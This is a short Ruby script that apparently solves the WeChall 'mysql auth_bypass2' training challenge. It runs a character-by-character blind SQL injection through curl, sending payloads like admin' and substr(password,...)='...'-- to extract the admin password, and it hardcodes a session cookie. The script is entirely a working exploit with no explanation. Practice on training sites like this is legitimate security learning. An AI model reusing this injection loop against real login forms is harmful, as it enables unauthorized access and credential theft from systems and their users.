require 'net/http'

allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
pass = ""
32.times do |i|
  allChars.split("").each do |c|
    puts "Password(#{i+1}/32): #{pass}"
    url = "https://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php"
    injection = "username=admin%27+and+substr%28password,1,#{pass.length+1}%29%3D%27#{pass+c}%27--+&password=&login=Login"
    req = `curl "#{url}" -X POST -H 'Cookie: WC=11505220-47569-RrANtBqpJ6O7bYfl' --data '#{injection}'`

    unless req.include? "username is unknown"
      pass += c
      break
    end
    system('clear')
  end
end
  

puts "Password for admin: #{pass}"
